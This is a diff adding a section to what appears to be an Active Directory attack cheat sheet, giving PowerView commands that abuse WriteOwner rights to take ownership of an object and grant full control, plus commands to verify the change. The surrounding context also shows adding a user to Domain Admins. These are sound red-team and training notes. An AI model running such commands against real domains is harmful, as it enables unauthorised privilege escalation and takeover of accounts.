@@ -327,6 +327,21 @@ net group "Domain Admins" analyst1 /domain /add
 ```
 
 ### Permissions on a ComputerObject
+#### Write owner - Change owner and give generic all
+- Use ```Remove-ObjectAcl``` and ```Set-DomainObjectOwner``` again to remove the ACL's
+```
+Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <NEW OWNER> -Verbose
+Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose
+
+# Check who is owner 
+Get-DomainObject -Identity <TARGET> -SecurityMasks Owner | select samaccountname, Owner
+Get-DomainObject -Identity <SID>
+
+# Check new rights - First get the SID of the user you want to check if he has permissions on target user
+Get-Domainuser <USERNAME>
+Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
+```
+
 #### GenericWrite - Computer object takeover
 See [Computer object takeover](#Computer-object-Takeover) 
 
